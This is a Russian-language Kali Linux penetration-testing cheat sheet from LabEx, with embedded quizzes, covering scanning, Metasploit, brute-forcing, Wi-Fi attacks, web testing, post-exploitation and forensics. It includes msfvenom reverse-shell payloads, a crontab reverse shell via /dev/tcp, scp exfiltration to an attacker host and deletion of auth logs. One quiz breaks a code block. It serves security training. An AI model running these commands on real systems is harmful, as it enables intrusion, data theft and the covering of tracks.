---
title: 'Шпаргалка по Kali Linux | LabEx'
description: 'Изучите тестирование на проникновение с Kali Linux с помощью этой исчерпывающей шпаргалки. Краткий справочник по инструментам безопасности, этичному хакингу, сканированию уязвимостей, эксплуатации и тестированию кибербезопасности.'
pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Шпаргалка по Kali Linux
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/ru/learn/kali">Изучите Kali Linux с практическими лабораториями</a>
</base-disclaimer-title>
<base-disclaimer-content>
Изучите тестирование на проникновение с помощью Kali Linux через практические лаборатории и сценарии реального мира. LabEx предлагает комплексные курсы по Kali Linux, охватывающие основные команды, сетевое сканирование, оценку уязвимостей, атаки на пароли, тестирование веб-приложений и цифровую криминалистику. Освойте методы этичного хакинга и инструменты аудита безопасности.
</base-disclaimer-content>
</base-disclaimer>

## Настройка и конфигурация системы

### Начальная настройка: `sudo apt update`

Обновление системных пакетов и репозиториев для оптимальной производительности.

```bash
# Обновить репозиторий пакетов
sudo apt update
# Обновить установленные пакеты
sudo apt upgrade
# Полное обновление системы
sudo apt full-upgrade
# Установить основные инструменты
sudo apt install curl wget git
```

### Управление пользователями: `sudo useradd`

Создание и управление учетными записями пользователей для тестирования безопасности.

```bash
# Добавить нового пользователя
sudo useradd -m username
# Установить пароль
sudo passwd username
# Добавить пользователя в группу sudo
sudo usermod -aG sudo username
# Сменить пользователя
su - username
```

### Управление службами: `systemctl`

Управление системными службами и демонами для тестовых сценариев.

```bash
# Запустить службу
sudo systemctl start apache2
# Остановить службу
sudo systemctl stop apache2
# Включить службу при загрузке
sudo systemctl enable ssh
# Проверить статус службы
sudo systemctl status postgresql
```

### Сетевая конфигурация: `ifconfig`

Настройка сетевых интерфейсов для тестирования на проникновение.

```bash
# Отобразить сетевые интерфейсы
ifconfig
# Настроить IP-адрес
sudo ifconfig eth0 192.168.1.100
# Включить/выключить интерфейс
sudo ifconfig eth0 up
# Настроить беспроводной интерфейс
sudo ifconfig wlan0 up
```

### Переменные окружения: `export`

Настройка переменных окружения и путей для тестовой среды.

```bash
# Установить IP цели
export TARGET=192.168.1.1
# Установить путь к словарю
export WORDLIST=/usr/share/wordlists/rockyou.txt
# Просмотреть переменные окружения
env | grep TARGET
```

<BaseQuiz id="kali-env-1" correct="C">
  <template #question>
    Что происходит с переменными окружения, установленными с помощью <code>export</code>?
  </template>
  
  <BaseQuizOption value="A">Они сохраняются после перезагрузки системы</BaseQuizOption>
  <BaseQuizOption value="B">Они доступны только в текущем файле</BaseQuizOption>
  <BaseQuizOption value="C" correct>Они доступны для текущей оболочки и дочерних процессов</BaseQuizOption>
  <BaseQuizOption value="D">Это глобальные системные переменные</BaseQuizOption>
  
  <BaseQuizAnswer>
    Переменные окружения, установленные с помощью <code>export</code>, доступны для текущей сессии оболочки и всех порожденных ею дочерних процессов. Они теряются, когда сессия оболочки завершается, если только они не добавлены в файлы конфигурации оболочки, такие как <code>.bashrc</code>.
  </BaseQuizAnswer>
</BaseQuiz>

### Установка инструментов: `apt install`

Установка дополнительных инструментов безопасности и зависимостей.

```bash
# Установить дополнительные инструменты
sudo apt install nmap wireshark burpsuite
# Установить из GitHub
git clone https://github.com/tool/repo.git
# Установить инструменты Python
pip3 install --user tool-name
```

## Обнаружение и сканирование сети

### Обнаружение хостов: `nmap -sn`

Идентификация активных хостов в сети с помощью ping-сканирования.

```bash
# Ping-сканирование
nmap -sn 192.168.1.0/24
# ARP-сканирование (локальная сеть)
nmap -PR 192.168.1.0/24
# ICMP echo-сканирование
nmap -PE 192.168.1.0/24
# Быстрое обнаружение хостов
masscan --ping 192.168.1.0/24
```

### Сканирование портов: `nmap`

Сканирование открытых портов и запущенных служб на целевых системах.

```bash
# Базовое TCP-сканирование
nmap 192.168.1.1
# Агрессивное сканирование
nmap -A 192.168.1.1
# UDP-сканирование
nmap -sU 192.168.1.1
# Скрытое SYN-сканирование
nmap -sS 192.168.1.1
```

<BaseQuiz id="kali-nmap-1" correct="B">
  <template #question>
    Что делает <code>nmap -sS</code>?
  </template>
  
  <BaseQuizOption value="A">Выполняет UDP-сканирование</BaseQuizOption>
  <BaseQuizOption value="B" correct>Выполняет скрытое SYN-сканирование (полуоткрытое сканирование)</BaseQuizOption>
  <BaseQuizOption value="C">Сканирует все порты</BaseQuizOption>
  <BaseQuizOption value="D">Выполняет обнаружение ОС</BaseQuizOption>
  
  <BaseQuizAnswer>
    Флаг <code>-sS</code> выполняет SYN-сканирование (также известное как полуоткрытое сканирование), поскольку оно никогда не завершает TCP-рукопожатие. Оно отправляет SYN-пакеты и анализирует ответы, что делает его более скрытным, чем полное TCP-соединение.
  </BaseQuizAnswer>
</BaseQuiz>

### Перечисление служб: `nmap -sV`

Определение версий служб и потенциальных уязвимостей.

```bash
# Обнаружение версий
nmap -sV 192.168.1.1
# Обнаружение ОС
nmap -O 192.168.1.1
```

<BaseQuiz id="kali-enumeration-1" correct="A">
  <template #question>
    Что делает <code>nmap -sV</code>?
  </template>
  
  <BaseQuizOption value="A" correct>Обнаруживает версии служб, работающих на открытых портах</BaseQuizOption>
  <BaseQuizOption value="B">Сканирует только порты версий</BaseQuizOption>
  <BaseQuizOption value="C">Показывает только уязвимые службы</BaseQuizOption>
  <BaseQuizOption value="D">Выполняет только обнаружение ОС</BaseQuizOption>
  
  <BaseQuizAnswer>
    Флаг <code>-sV</code> включает обнаружение версий, которое опрашивает открытые порты для определения запущенной службы и ее версии. Это полезно для выявления потенциальных уязвимостей, связанных с конкретными версиями программного обеспечения.
  </BaseQuizAnswer>
</BaseQuiz>
# Скриптовое сканирование
nmap -sC 192.168.1.1
# Комплексное сканирование
nmap -sS -sV -O -A 192.168.1.1
```

## Сбор информации и разведка

### Перечисление DNS: `dig`

Сбор информации DNS и выполнение зональных трансферов.

```bash
# Базовый DNS-запрос
dig example.com
# Обратный DNS-запрос
dig -x 192.168.1.1
# Попытка зонального трансфера
dig @ns1.example.com example.com axfr
# Перечисление DNS
dnsrecon -d example.com
```

### Веб-разведка: `dirb`

Обнаружение скрытых каталогов и файлов на веб-серверах.

```bash
# Перебор каталогов
dirb http://192.168.1.1
# Пользовательский словарь
dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Альтернатива Gobuster
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### Информация WHOIS: `whois`

Сбор информации о регистрации домена и владельце.

```bash
# WHOIS-запрос
whois example.com
# IP WHOIS
whois 8.8.8.8
# Комплексный сбор информации
theharvester -d example.com -l 100 -b google
```

### Анализ SSL/TLS: `sslscan`

Анализ конфигурации SSL/TLS и уязвимостей.

```bash
# SSL-сканирование
sslscan 192.168.1.1:443
# Комплексный анализ testssl
testssl.sh https://example.com
# Информация о SSL-сертификате
openssl s_client -connect example.com:443
```

### Перечисление SMB: `enum4linux`

Перечисление общих ресурсов SMB и информации NetBIOS.

```bash
# Перечисление SMB
enum4linux 192.168.1.1
# Список общих ресурсов SMB
smbclient -L //192.168.1.1
# Подключение к общему ресурсу
smbclient //192.168.1.1/share
# Сканирование уязвимостей SMB
nmap --script smb-vuln* 192.168.1.1
```

### Перечисление SNMP: `snmpwalk`

Сбор системной информации через протокол SNMP.

```bash
# SNMP walk
snmpwalk -c public -v1 192.168.1.1
# Проверка SNMP
onesixtyone -c community.txt 192.168.1.1
# Перечисление SNMP
snmp-check 192.168.1.1
```

## Анализ уязвимостей и эксплуатация

### Сканирование уязвимостей: `nessus`

Выявление уязвимостей безопасности с помощью автоматизированных сканеров.

```bash
# Запуск службы Nessus
sudo systemctl start nessusd
# Запуск сканирования OpenVAS
openvas-start
# Сканер веб-уязвимостей Nikto
nikto -h http://192.168.1.1
# SQLmap для SQL-инъекций
sqlmap -u "http://example.com/page.php?id=1"
```

### Фреймворк Metasploit: `msfconsole`

Запуск эксплойтов и управление кампаниями по тестированию на проникновение.

```bash
# Запуск Metasploit
msfconsole
# Поиск эксплойтов
search ms17-010
# Использование эксплойта
use exploit/windows/smb/ms17_010_eternalblue
# Установка RHOSTS
set RHOSTS 192.168.1.1
```

### Тестирование переполнения буфера: `pattern_create`

Генерация шаблонов для эксплуатации переполнения буфера.

```bash
# Создать шаблон
pattern_create.rb -l 400
# Найти смещение
pattern_offset.rb -l 400 -q EIP_value
```

### Разработка пользовательских эксплойтов: `msfvenom`

Создание пользовательских полезных нагрузок для конкретных целей.

```bash
# Генерация shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Обратный шелл Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
# Обратный шелл Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## Атаки на пароли и тестирование учетных данных

### Атаки перебором: `hydra`

Выполнение атак перебором логинов против различных служб.

```bash
# SSH перебор
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# HTTP-форма перебор
hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
# FTP перебор
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### Взлом хешей: `hashcat`

Взлом хешей паролей с использованием ускорения GPU.

```bash
# Взлом MD5-хеша
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Взлом NTLM-хеша
hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
# Генерация вариаций словаря
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
```

### John the Ripper: `john`

Традиционный взлом паролей с использованием различных режимов атаки.

```bash
# Взлом файла паролей
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# Показать взломанные пароли
john --show shadow.txt
# Инкрементальный режим
john --incremental shadow.txt
# Пользовательские правила
john --rules --wordlist=passwords.txt shadow.txt
```

### Генерация словарей: `crunch`

Создание пользовательских словарей для целевых атак.

```bash
# Генерация словаря из 4-8 символов
crunch 4 8 -o wordlist.txt
# Пользовательский набор символов
crunch 6 6 -t admin@ -o passwords.txt
# Генерация на основе шаблона
crunch 8 8 -t @@@@%%%% -o mixed.txt
```

## Тестирование безопасности беспроводных сетей

### Настройка режима мониторинга: `airmon-ng`

Настройка беспроводного адаптера для захвата пакетов и инъекций.

```bash
# Включить режим мониторинга
sudo airmon-ng start wlan0
# Проверить конфликтующие процессы
sudo airmon-ng check kill
# Выключить режим мониторинга
sudo airmon-ng stop wlan0mon
```

### Обнаружение сетей: `airodump-ng`

Обнаружение и мониторинг беспроводных сетей и клиентов.

```bash
# Сканирование всех сетей
sudo airodump-ng wlan0mon
# Целевая сеть
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Показать только WEP сети
sudo airodump-ng --encrypt WEP wlan0mon
```

### Атаки WPA/WPA2: `aircrack-ng`

Выполнение атак против сетей, зашифрованных WPA/WPA2.

```bash
# Атака Deauth
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Взлом захваченного рукопожатия
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# Атака WPS с помощью Reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### Атака Evil Twin: `hostapd`

Создание поддельных точек доступа для сбора учетных данных.

```bash
# Запуск поддельной точки доступа
sudo hostapd hostapd.conf
# Служба DHCP
sudo dnsmasq -C dnsmasq.conf
# Захват учетных данных
ettercap -T -M arp:remote /192.168.1.0/24//
```

## Тестирование безопасности веб-приложений

### Тестирование SQL-инъекций: `sqlmap`

Автоматическое обнаружение и эксплуатация SQL-инъекций.

```bash
# Базовый тест SQL-инъекции
sqlmap -u "http://example.com/page.php?id=1"
# Тестирование параметров POST
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
# Извлечение базы данных
sqlmap -u "http://example.com/page.php?id=1" --dbs
# Дамп конкретной таблицы
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### Межсайтовый скриптинг: `xsser`

Тестирование веб-приложений на наличие XSS-уязвимостей.

```bash
# Тестирование XSS
xsser --url "http://example.com/search.php?q=XSS"
# Автоматическое обнаружение XSS
xsser -u "http://example.com" --crawl=10
# Пользовательская полезная нагрузка
xsser --url "http://example.com" --payload="<script>alert(1)</script>"
```

### Интеграция Burp Suite: `burpsuite`

Комплексная платформа для тестирования безопасности веб-приложений.

```bash
# Запуск Burp Suite
burpsuite
# Настройка прокси (127.0.0.1:8080)
# Настройка прокси браузера для перехвата трафика
# Использование Intruder для автоматизированных атак
# Spider для обнаружения контента
```

### Обход каталогов: `wfuzz`

Тестирование на уязвимости обхода каталогов и включения файлов.

```bash
# Перебор каталогов
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
# Перебор параметров
wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
```

## Постэксплуатация и повышение привилегий

### Системное перечисление: `linpeas`

Автоматизированный перебор для повышения привилегий в Linux.

```bash
# Загрузка LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# Сделать исполняемым
chmod +x linpeas.sh
# Запуск перечисления
./linpeas.sh
# Альтернатива для Windows: winPEAS.exe
```

### Механизмы сохранения: `crontab`

Установление постоянного доступа в скомпрометированных системах.

```bash
# Редактирование crontab
crontab -e
# Добавить обратный шелл
@reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
# Постоянство SSH-ключа
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### Эксфильтрация данных: `scp`

Безопасная передача данных из скомпрометированных систем.

```bash
# Скопировать файл на машину атакующего
scp file.txt user@192.168.1.100:/tmp/
# Сжать и передать
tar -czf data.tar.gz /home/user/documents
scp data.tar.gz attacker@192.168.1.100:/tmp/
# Эксфильтрация по HTTP
python3 -m http.server 8000
```

### Сокрытие следов: `history`

Удаление следов активности в скомпрометированных системах.

```bash
# Очистить историю bash
history -c
unset HISTFILE
# Удалить конкретные записи
history -d line_number
# Очистить системные журналы
sudo rm /var/log/auth.log*
```

## Цифровая криминалистика и анализ

### Образ диска: `dd`

Создание криминалистических образов устройств хранения данных.

```bash
# Создать образ диска
sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
# Проверить целостность образа
md5sum /dev/sdb > original.md5
md5sum /tmp/evidence.img > image.md5
# Смонтировать образ
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
```

### Восстановление файлов: `foremost`

Восстановление удаленных файлов из образов дисков или разделов.

```bash
# Восстановить файлы из образа
foremost -i evidence.img -o recovered/
# Конкретные типы файлов
foremost -t jpg,png,pdf -i evidence.img -o photos/
# Альтернатива PhotoRec
photorec evidence.img
```

### Анализ памяти: `volatility`

Анализ дампов оперативной памяти на предмет криминалистических улик.

```bash
# Определить профиль ОС
volatility -f memory.dump imageinfo
# Список процессов
volatility -f memory.dump --profile=Win7SP1x64 pslist
# Извлечь процесс
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
```

### Анализ сетевых пакетов: `wireshark`

Анализ захваченного сетевого трафика на предмет криминалистических улик.

```bash
# Запуск Wireshark
wireshark
# Анализ в командной строке
tshark -r capture.pcap -Y "http.request.method==GET"
# Извлечение файлов
foremost -i capture.pcap -o extracted/
```

## Генерация отчетов и документация

### Захват скриншотов: `gnome-screenshot`

Документирование результатов с помощью систематического захвата скриншотов.

```bash
# Захват всего экрана
gnome-screenshot -f screenshot.png
# Захват окна
gnome-screenshot -w -f window.png
# Захват с задержкой
gnome-screenshot -d 5 -f delayed.png
# Выбор области
gnome-screenshot -a -f area.png
```

### Управление журналами: `script`

Запись сеансов терминала для целей документирования.

```bash
# Начать запись сеанса
script session.log
# Запись с таймингом
script -T session.time session.log
# Повторное воспроизведение сеанса
scriptreplay session.time session.log
```

### Шаблоны отчетов: `reportlab`

Генерация профессиональных отчетов о тестировании на проникновение.

```bash
# Установка инструментов для отчетов
pip3 install reportlab
# Генерация PDF-отчета
python3 generate_report.py
# Markdown в PDF
pandoc report.md -o report.pdf
```

### Целостность улик: `sha256sum`

Поддержание цепочки владения с помощью криптографических хешей.

```bash
# Генерация контрольных сумм
sha256sum evidence.img > evidence.sha256
# Проверка целостности
sha256sum -c evidence.sha256
# Контрольные суммы нескольких файлов
find /evidence -type f -exec sha256sum {} \; > all_files.sha256
```

## Обслуживание и оптимизация системы

### Управление пакетами: `apt`

Поддержание и обновление системных пакетов и инструментов безопасности.

```bash
# Обновить списки пакетов
sudo apt update
# Обновить все пакеты
sudo apt upgrade
# Установить конкретный инструмент
sudo apt install tool-name
# Удалить неиспользуемые пакеты
sudo apt autoremove
```

### Обновления ядра: `uname`

Мониторинг и обновление системного ядра для исправлений безопасности.

```bash
# Проверить текущее ядро
uname -r
# Показать доступные для обновления ядра
apt list --upgradable | grep linux-image
# Установить новое ядро
sudo apt install linux-image-generic
# Удалить старые ядра
sudo apt autoremove --purge
```

### Проверка инструментов: `which`

Проверка установки инструментов и поиск исполняемых файлов.

```bash
# Найти инструмент
which nmap
# Проверить наличие инструмента
command -v metasploit
# Список всех инструментов в каталоге
ls /usr/bin/ | grep -i security
```

### Мониторинг ресурсов: `htop`

Мониторинг системных ресурсов во время интенсивного тестирования безопасности.

```bash
# Интерактивный просмотр процессов
htop
# Использование памяти
free -h
# Использование диска
df -h
# Сетевые подключения
netstat -tulnp
```

## Основные сочетания клавиш и псевдонимы Kali Linux

### Создание псевдонимов: `.bashrc`

Настройка сочетаний клавиш для экономии времени при выполнении частых задач.

```bash
# Редактировать bashrc
nano ~/.bashrc
# Полезные псевдонимы
alias ll='ls -la'
alias nse='nmap --script-help'
alias target='export TARGET='
alias msf='msfconsole -q'
# Перезагрузить bashrc
source ~/.bashrc
```

### Пользовательские функции: `function`

Создание расширенных комбинаций команд для общих рабочих процессов.

```bash
# Быстрое nmap-сканирование
function qscan() {
    nmap -sS -sV -O $1
}
# Настройка для пентеста
function pentest-setup() {
    mkdir -p {recon,scans,exploits,loot}
}
```

### Сочетания клавиш: Терминал

Освоение основных сочетаний клавиш терминала для более быстрой навигации.

```bash
# Сочетания клавиш терминала
# Ctrl+C - Прервать текущую команду
# Ctrl+Z - Приостановить текущую команду
# Ctrl+L - Очистить экран
# Ctrl+R - Поиск в истории команд
# Tab - Автодополнение команд
# Up/Down - Навигация по истории команд
```

### Конфигурация окружения: `tmux`

Настройка постоянных сеансов терминала для длительных задач.

```bash
# Начать новую сессию
tmux new-session -s pentest
# Отключиться от сессии
# Ctrl+B, D
# Список сессий
tmux list-sessions
# Подключиться к сессии
tmux attach -t pentest
```

## Соответствующие ссылки

- <router-link to="/linux">Шпаргалка по Linux</router-link>
- <router-link to="/shell">Шпаргалка по Shell</router-link>
- <router-link to="/cybersecurity">Шпаргалка по кибербезопасности</router-link>
- <router-link to="/nmap">Шпаргалка по Nmap</router-link>
- <router-link to="/wireshark">Шпаргалка по Wireshark</router-link>
- <router-link to="/hydra">Шпаргалка по Hydra</router-link>
- <router-link to="/devops">Шпаргалка по DevOps</router-link>
- <router-link to="/docker">Шпаргалка по Docker</router-link>
